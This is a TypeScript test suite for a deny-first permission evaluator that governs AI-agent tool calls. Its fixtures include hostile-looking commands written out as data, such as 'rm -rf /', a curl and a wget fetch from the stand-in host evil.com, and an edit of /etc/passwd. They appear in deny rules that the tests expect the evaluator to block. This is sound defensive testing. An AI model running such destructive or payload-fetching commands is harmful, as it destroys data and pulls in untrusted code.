/**
 * Tests for the deny-first permission evaluator.
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { evaluate, type PermissionPolicy } from "../evaluate.ts";

describe("evaluate", () => {
  describe("deny-first semantics", () => {
    it("denies when a deny rule matches, even if allow also matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "autonomous",
        permissions: {
          deny: ["Bash(rm -rf *)"],
          allow: ["Bash(*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "rm -rf /tmp/thing"), "deny");
    });

    it("denies when both deny and ask match", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["Bash(curl *)"],
          ask: ["Bash(curl *)"],
        },
      };
      assert.equal(
        evaluate(policy, "bash", "curl https://example.com"),
        "deny",
      );
    });

    it("asks when ask matches and no deny matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "autonomous",
        permissions: {
          ask: ["Bash(curl *)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "curl https://example.com"), "ask");
    });

    it("allows when allow matches and no deny/ask matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(ls *)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "ls -la"), "allow");
    });
  });

  describe("default mode fallback", () => {
    it("allows in autonomous mode with no matching rules", () => {
      const policy: PermissionPolicy = {
        defaultMode: "autonomous",
        permissions: {
          deny: ["Edit(*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "ls"), "allow");
    });

    it("denies in readonly mode with no matching rules", () => {
      const policy: PermissionPolicy = {
        defaultMode: "readonly",
        permissions: {},
      };
      assert.equal(evaluate(policy, "bash", "echo hello"), "deny");
    });

    it("asks in standard mode with no matching rules", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {},
      };
      assert.equal(evaluate(policy, "bash", "echo hello"), "ask");
    });

    it("asks in restricted mode with no matching rules", () => {
      const policy: PermissionPolicy = {
        defaultMode: "restricted",
        permissions: {},
      };
      assert.equal(evaluate(policy, "bash", "echo hello"), "ask");
    });

    it("falls back to default when no permissions object exists", () => {
      const policy: PermissionPolicy = {
        defaultMode: "autonomous",
      };
      assert.equal(evaluate(policy, "bash", "anything"), "allow");
    });

    it("defaults to ask for standard mode without permissions", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
      };
      assert.equal(evaluate(policy, "bash", "anything"), "ask");
    });
  });

  describe("bare tool name matching", () => {
    it("matches exact tool name without pattern", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["bash"],
        },
      };
      assert.equal(evaluate(policy, "bash", "anything"), "allow");
    });

    it("does not match different tool name", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["bash"],
        },
      };
      assert.equal(evaluate(policy, "edit", "/some/file"), "ask");
    });

    it("matches case-insensitively", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash"],
        },
      };
      assert.equal(evaluate(policy, "bash", "anything"), "allow");
    });
  });

  describe("pattern matching — ToolName(pattern)", () => {
    it("matches tool name with glob pattern against input", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git *)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "git commit -m test"), "allow");
    });

    it("rejects when tool name matches but pattern does not", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git *)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "npm install"), "ask");
    });

    it("empty parens match any input for that tool", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash()"],
        },
      };
      assert.equal(evaluate(policy, "bash", "anything at all"), "allow");
    });
  });

  describe("domain pattern — domain:example.com", () => {
    it("matches when input contains the domain", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["Bash(domain:evil.com)"],
        },
      };
      assert.equal(
        evaluate(policy, "bash", "curl https://evil.com/payload"),
        "deny",
      );
    });

    it("does not match when domain is absent", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["Bash(domain:evil.com)"],
        },
      };
      assert.equal(
        evaluate(policy, "bash", "curl https://safe.com/page"),
        "ask",
      );
    });

    it("matches domain as substring", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["Bash(domain:evil.com)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "wget sub.evil.com/path"), "deny");
    });
  });

  describe("prefix pattern — prefix:*", () => {
    it("matches when input starts with prefix", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git:*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "git:status"), "allow");
    });

    it("does not match when input has different prefix", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Bash(git:*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "npm:install"), "ask");
    });
  });

  describe("glob matching in tool names", () => {
    it("matches MCP tool prefix with wildcard", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["mcp__server__*"],
        },
      };
      assert.equal(evaluate(policy, "mcp__server__read", ""), "allow");
      assert.equal(evaluate(policy, "mcp__server__write", ""), "allow");
    });

    it("matches single-character wildcard", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["bash_?"],
        },
      };
      assert.equal(evaluate(policy, "bash_1", ""), "allow");
      assert.equal(evaluate(policy, "bash_a", ""), "allow");
      assert.equal(evaluate(policy, "bash_12", ""), "ask");
    });
  });

  describe("multiple rules in same tier", () => {
    it("checks all deny rules before moving to ask", () => {
      const policy: PermissionPolicy = {
        defaultMode: "autonomous",
        permissions: {
          deny: ["Bash(rm *)", "Bash(domain:evil.com)"],
          allow: ["Bash(*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "rm -rf /"), "deny");
      assert.equal(evaluate(policy, "bash", "curl https://evil.com/x"), "deny");
      assert.equal(evaluate(policy, "bash", "ls -la"), "allow");
    });

    it("checks all ask rules before moving to allow", () => {
      const policy: PermissionPolicy = {
        defaultMode: "autonomous",
        permissions: {
          ask: ["Bash(curl *)", "Bash(wget *)"],
          allow: ["Bash(*)"],
        },
      };
      assert.equal(evaluate(policy, "bash", "curl https://x.com"), "ask");
      assert.equal(evaluate(policy, "bash", "wget https://x.com"), "ask");
      assert.equal(evaluate(policy, "bash", "ls"), "allow");
    });
  });

  describe("path-based matching for file tools", () => {
    it("matches file path patterns", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["Edit(/etc/*)"],
          allow: ["Edit(*)"],
        },
      };
      assert.equal(evaluate(policy, "edit", "/etc/passwd"), "deny");
      assert.equal(evaluate(policy, "edit", "/home/user/file.ts"), "allow");
    });

    it("matches read tool path patterns", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          allow: ["Read(src/*)"],
        },
      };
      assert.equal(evaluate(policy, "read", "src/index.ts"), "allow");
      assert.equal(evaluate(policy, "read", "dist/index.js"), "ask");
    });
  });

  describe("edge cases", () => {
    it("handles empty permissions object", () => {
      const policy: PermissionPolicy = {
        defaultMode: "autonomous",
        permissions: {},
      };
      assert.equal(evaluate(policy, "bash", "anything"), "allow");
    });

    it("handles empty rule arrays", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: [],
          allow: [],
        },
      };
      assert.equal(evaluate(policy, "bash", "anything"), "ask");
    });

    it("handles special regex characters in patterns", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        permissions: {
          deny: ["Bash(+$[]() {})"],
        },
      };
      // Special chars should be escaped, not treated as regex
      assert.equal(evaluate(policy, "bash", "+$[]() {}"), "deny");
    });
  });
});
